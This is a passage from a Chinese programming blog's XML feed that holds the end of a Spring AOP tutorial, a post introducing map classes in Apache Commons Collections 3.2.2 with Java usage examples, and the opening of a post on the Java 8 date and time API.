function">println</span><span class="token punctuation">(</span><span class="token string">"---方法规则式拦截:"</span> <span class="token operator">+</span> method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>代码解释</strong>：</p><ol><li>通过 @Aspect 注解声明一个切面。</li><li>通过 @Component 让此切面成为 Spring 容器管理的Bean。</li><li>通过 @PointCut 注解声明切点。</li><li>通过 @After 注解声明一个通知类型，并使用 @PointCut定义的切点。</li><li>通过可获得注解上的属性，然后做日志记录相关的操作，下面相同。</li><li>通过 @Before 注解声明一个通知类型，此通知直接使用拦截规则作为参数。</li></ol></blockquote><p>（6）配置类。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ComponentScan</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">EnableAspectJAutoProxy</span></span><span class="token punctuation">;</span><span class="token comment">/** * Created by blinkfox on 2016/10/29. */</span><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"com.blinkfox"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@EnableAspectJAutoProxy</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AopConfig</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>代码解释</strong>：</p><ol><li>使用 @EnableAspectJAutoProxy 注解开启 Spring 对 AspectJ的支持。</li></ol></blockquote><p>（6）运行。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>maintest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">AopConfig</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">DemoAnnotationService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>blinkfox<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">DemoMethodService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">AnnotationConfigApplicationContext</span></span><span class="token punctuation">;</span><span class="token comment">/** * Created by blinkfox on 2016/10/29. */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AopMain</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">AnnotationConfigApplicationContext</span> context <span class="token operator">=</span>                <span class="token keyword">new</span> <span class="token class-name">AnnotationConfigApplicationContext</span><span class="token punctuation">(</span><span class="token class-name">AopConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DemoAnnotationService</span> demoAnnotationService <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">DemoAnnotationService</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DemoMethodService</span> demoMethodService <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">DemoMethodService</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        demoAnnotationService<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        demoMethodService<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        context<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Commons Collections包和简介</title>
      <link href="/2018/09/13/hou-duan/commons-collections-bao-he-jian-jie/"/>
      <url>/2018/09/13/hou-duan/commons-collections-bao-he-jian-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p><a href="http://commons.apache.org/">Apache Commons</a>是Apache软件基金会的项目，曾经隶属于<code>Jakarta</code>项目。<code>Commons</code>的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：<code>Proper</code>（是一些已发布的项目）、<code>Sandbox</code>（是一些正在开发的项目）和<code>Dormant</code>（是一些刚启动或者已经停止维护的项目）。</p><p><a href="http://commons.apache.org/proper/commons-collections/">Commons Collections</a>包为Java标准的<code>Collections API</code>提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p><h2 id="一、包结构介绍"><a href="#一、包结构介绍" class="headerlink" title="一、包结构介绍"></a>一、包结构介绍</h2><blockquote><p>注意：Commons Collections的最新版是4.1，但由于工作中大多还是3.x的版本，这里就以3.x中的最后一个版本3.2.2作使用介绍。</p></blockquote><p>以下是Collections的包结构和简单介绍，如果你想了解更多的各个包下的接口和实现，请参考<a href="http://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/index.html">Apache Commons Collections 3.2.2 API文档</a>。</p><ul><li><code>org.apache.commons.collections</code> – CommonsCollections自定义的一组公用的接口和工具类</li><li><code>org.apache.commons.collections.bag</code> – 实现Bag接口的一组类</li><li><code>org.apache.commons.collections.bidimap</code> – 实现BidiMap系列接口的一组类</li><li><code>org.apache.commons.collections.buffer</code> – 实现Buffer接口的一组类</li><li><code>org.apache.commons.collections.collection</code> –实现java.util.Collection接口的一组类</li><li><code>org.apache.commons.collections.comparators</code>– 实现java.util.Comparator接口的一组类</li><li><code>org.apache.commons.collections.functors</code> –Commons Collections自定义的一组功能类</li><li><code>org.apache.commons.collections.iterators</code> – 实现java.util.Iterator接口的一组类</li><li><code>org.apache.commons.collections.keyvalue</code> – 实现集合和键/值映射相关的一组类</li><li><code>org.apache.commons.collections.list</code> – 实现java.util.List接口的一组类</li><li><code>org.apache.commons.collections.map</code> – 实现Map系列接口的一组类</li><li><code>org.apache.commons.collections.set</code> – 实现Set系列接口的一组类</li></ul><h2 id="二、Map的一些介绍"><a href="#二、Map的一些介绍" class="headerlink" title="二、Map的一些介绍"></a>二、Map的一些介绍</h2><p><code>Collections</code>包中的“Map”是在<code>java.util.Map</code>的基础上扩展的接口和类。有如下常用的Map:</p><ul><li><strong>LinkedMap</strong>，可以维护条目顺序的map；</li><li><strong>BidiMap</strong>，即双向Map，可以通过key找到value，也可以通过value找到key。需要注意的是BidiMap中key和value都不可以重复；</li><li><strong>MultiMap</strong>，一个key指向的是一组对象，add()和remove()的时候跟普通的Map无异，只是在get()时返回一个Collection，实现了一对多；</li><li><strong>LazyMap</strong>，即Map中的键/值对一开始并不存在，当被调用到时才创建。</li></ul><h2 id="三、Collections中Map的使用示例"><a href="#三、Collections中Map的使用示例" class="headerlink" title="三、Collections中Map的使用示例"></a>三、Collections中Map的使用示例</h2><h3 id="1-Map迭代器之mapIterator"><a href="#1-Map迭代器之mapIterator" class="headerlink" title="1. Map迭代器之mapIterator"></a>1. Map迭代器之mapIterator</h3><p><code>jdk</code>中的<code>Map</code>接口很难进行迭代。<code>api</code>用户总是需要通过<code>entryset</code>或者<code>keyset</code>进行迭代。<code>commons-collectons</code>现在提供了一个新的接口 - <code>mapIterator</code>来允许对<code>maps</code>进行简单的迭代。示例如下：</p><p>(1)、构造Map初始数据的方法：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** * 构建map初始数据 * @param map */</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Map</span> <span class="token function">buildMap</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"one"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"two"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"three"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"four"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> map<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(2)、使用MapIterator迭代数据的方法：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** * map迭代器 * 遍历打印map,使用map.mapIterator() * @param map * @param mapName */</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">iteratorMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Map</span> map <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">buildMap</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 遍历map,使用MapIterator</span>    <span class="token class-name">MapIterator</span> it <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">mapIterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>it<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Object</span> key <span class="token operator">=</span> it<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> value <span class="token operator">=</span> it<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"iterator map key:"</span> <span class="token operator">+</span> key <span class="token operator">+</span> <span class="token string">", value: "</span> <span class="token operator">+</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-有序map之LinkedMap"><a href="#2-有序map之LinkedMap" class="headerlink" title="2. 有序map之LinkedMap"></a>2. 有序map之LinkedMap</h3><p><code>LinkedMap</code>是一个可以维护Map中条目顺序的Map实现，条目顺序由最初的数据插入时来决定。同时也增加上面所说的<code>MapIterator</code>功能和一些便利的方法，并允许进行双向迭代。相较于<code>JDK1.4</code>中的<code>LinkedHashMap</code>效率有所提高，它还实现了<code>OrderedMap</code>接口。此外，还提供了非接口方法通过索引来访问Map中的数据。<strong>需要注意的是LinkedMap不是同步的，不是线程安全的</strong>。如果你想使用<code>LinkedMap</code>的同时使用多个线程，您必须使用适当的同步操作。最简单的方法是使用<code>Collections.synchronizedMap(Map)</code>来包装<code>LinkedMap</code>。如果不使用同步操作，当并发线程访问这个类时可能会抛出异常。</p><p>LinkedMap的一些代码示例代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** * 有序map之LinkedMap */</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">linkedMapTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">OrderedMap</span> orderMap <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">buildMap</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LinkedMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 获取map中相应的值</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"LinkedMap firstKey:"</span> <span class="token operator">+</span> orderMap<span class="token punctuation">.</span><span class="token function">firstKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"LinkedMap previous key:"</span> <span class="token operator">+</span> orderMap<span class="token punctuation">.</span><span class="token function">previousKey</span><span class="token punctuation">(</span><span class="token string">"four"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"LinkedMap next key:"</span> <span class="token operator">+</span> orderMap<span class="token punctuation">.</span><span class="token function">nextKey</span><span class="token punctuation">(</span><span class="token string">"two"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"LinkedMap last key:"</span> <span class="token operator">+</span> orderMap<span class="token punctuation">.</span><span class="token function">lastKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"LinkedMap map Size:"</span> <span class="token operator">+</span> orderMap<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-双向Map之BidiMap"><a href="#3-双向Map之BidiMap" class="headerlink" title="3. 双向Map之BidiMap"></a>3. 双向Map之BidiMap</h3><p>所谓<code>BidiMap</code>，直译就是双向<code>Map</code>，可以通过<code>key</code>找到<code>value</code>，也可以通过<code>value</code>找到<code>key</code>，这在我们日常的代码-名称匹配的时候很方便：因为我们除了需要通过代码找到名称之外，往往也需要处理用户输入的名称，然后获取其代码。需要注意的是BidiMap当中不光key不能重复，value也不可以重复。基本使用示例如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** * BidiMap,是双向Map * 通过key得到value * 通过value得到key * 注意的是BidiMap,当中不光key不能重复，value也不可以。 */</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">bidiMapTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">BidiMap</span> bidiMap <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">buildMap</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TreeBidiMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 有相同值的，只有最后一个生效</span>    bidiMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"san"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">loopMap</span><span class="token punctuation">(</span>bidiMap<span class="token punctuation">,</span> <span class="token string">"BidiMap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 获取map中相应的值</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"BidiMap getKey:"</span> <span class="token operator">+</span> bidiMap<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"BidiMap getMoreSameKey:"</span> <span class="token operator">+</span> bidiMap<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 移除map的value</span>    bidiMap<span class="token punctuation">.</span><span class="token function">removeValue</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"BidiMap getMoreSameKey2:"</span> <span class="token operator">+</span> bidiMap<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 交换map的key和value</span>    <span class="token class-name">BidiMap</span> inversMap <span class="token operator">=</span> bidiMap<span class="token punctuation">.</span><span class="token function">inverseBidiMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-多值Map之MultiMap"><a href="#4-多值Map之MultiMap" class="headerlink" title="4. 多值Map之MultiMap"></a>4. 多值Map之MultiMap</h3><p>所谓<code>MultiMap</code>，就是说单个<code>key</code>可以对应多个<code>value</code>,在<code>put</code>或<code>remove</code>时和普通<code>Map</code>没有区别,但当<code>get</code>时将返回多个<code>value</code>,所以返回一个<code>collections</code>,利用<code>MultiMap</code>，我们就可以很方便的往一个<code>key</code>上放数量不定的对象，也就实现了一对多。在3.2.1版本中<code>MultiHashMap</code>已被废除,请使用<code>MultiValueMap</code>。简单的使用示例如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">multiMapTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">MultiMap</span> multiMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MultiValueMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    multiMap <span class="token operator">=</span> <span class="token function">multibuildMap</span><span class="token punctuation">(</span>multiMap<span class="token punctuation">)</span><span class="token punctuation">;</span>    multiMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"three"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> multiMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"three"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 会打印: list:[3, 5]</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"list:"</span> <span class="token operator">+</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-“懒加载”Map之LazyMap"><a href="#5-“懒加载”Map之LazyMap" class="headerlink" title="5. “懒加载”Map之LazyMap"></a>5. “懒加载”Map之LazyMap</h3><p>所谓<code>LazyMap</code>，意思就是这个<code>Map</code>中的键/值对一开始并不存在，当被调用到时才会创建，这样的解释初听上去是不是有点不可思议，这样的<code>LazyMap</code>有用吗？我们这样来理解：我们需要一个<code>Map</code>，但是由于创建成员的方法很“重”（比如数据库访问），或者我们只有在调用<code>get()</code>时才知道如何创建，或者<code>Map</code>中出现的可能性很多很多，我们无法在<code>get()</code>之前添加所有可能出现的键/值对，或者任何其它解释得通的原因，我们觉得没有必要去初始化一个<code>Map</code>而又希望它可以在必要时自动处理数据生成的话，<code>LazyMap</code>就变得很有用了。简单的使用示例如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** * LazyMap.类似与Hibenrate的懒加载,在声明的时候并不会创建, * 而是在使用(get)的时候,才创建集合的内容,返回Factory的返回值 * 实现懒加载,当我们觉得没有必要去初始化一个Map而又希望它可以在必要时自动处理数据可以使用LazyMap * 有LazyList与LazyMap对应 */</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">lazyMapTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//创建一个工厂，实现create方法</span>    <span class="token class-name">Factory</span> factory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Factory</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 创建的默认值</span>            <span class="token keyword">return</span> <span class="token string">"这是LazyMap get()不到时创建的默认值"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> factory<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"map:"</span> <span class="token operator">+</span> lazyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//当此lazyMap调用get(key)时，如果无此key则返回varFactory里create方法返回的值</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"map:"</span> <span class="token operator">+</span> lazyMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 有key对应的值时,返回123</span>    lazyMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"map:"</span> <span class="token operator">+</span> lazyMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Apache Commons Collections</code>中的基本<code>map</code>的接口类型和使用方法，不仅有上面这些，还有很多细分的、拥有不同功能或者各功能会有交叉的<code>map</code>，等着我们在自己工作中去使用挖掘吧！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Apache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java8中关于日期和时间API的20个使用示例</title>
      <link href="/2018/09/13/hou-duan/java-8-zhong-guan-yu-ri-qi-he-shi-jian-api-de-20-ge-shi-yong-shi-li/"/>
      <url>/2018/09/13/hou-duan/java-8-zhong-guan-yu-ri-qi-he-shi-jian-api-de-20-ge-shi-yong-shi-li/</url>
      
        <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>随着<a href="http://javarevisited.blogspot.sg/2014/02/10-example-of-lambda-expressions-in-java8.html"><code>lambda</code></a>表达式、<a href="http://java67.blogspot.sg/2014/04/java-8-stream-api-examples-filter-map.html">streams</a>以及一系列小优化，Java8推出了全新的日期时间API，在一下的指南中我们将通过一些简单的示例来学习如何使用新API。Java处理日期、日历和时间的方式一直为社区所诟病，将<code>java.util.Date</code>设定为可变类型，以及<a href="http://javarevisited.blogspot.sg/2012/03/simpledateformat-in-java-is-not-thread.html"><code>SimpleDateFormat</code>的非线程安全</a>使其应用非常受限。<code>Java</code>也意识到需要一个更好的<code>API</code>来满足社区中已经习惯了使用<code>JodaTime API</code>的人们。全新<code>API</code>的众多好处之一就是，明确了日期时间概念，例如：瞬时（instant）、期间（duration）、日期、时间、时区和周期。同时继承了<code>Joda</code>库按人类语言和计算机各自解析的时间处理方式。不同于老版本，新<code>API</code>基于ISO标准日历系统，<code>java.time</code>包下的所有类都是不可变类型而且线程安全。下面是新版API中<code>java.time</code>包里的一些关键类：</p><ul><li><code>Instant</code>：瞬时实例。</li><li><code>LocalDate</code>：本地日期，不包含具体时间。例如：<code>2014-01-14</code>可以用来记录生日、纪念日、加盟日等。</li><li><code>LocalTime</code>：本地时间，不包含日期。</li><li><code>LocalDateTime</code>：组合了日期和时间，但不包含时差和时区信息。</li><li><code>ZonedDateTime</code>：最完整的日期时间，包含时区和相对UTC或格林威治的时差。</li></ul><p>新API还引入了<code>ZoneOffSet</code>和<code>ZoneId</code>类，使得解决时区问题更为简便。<a 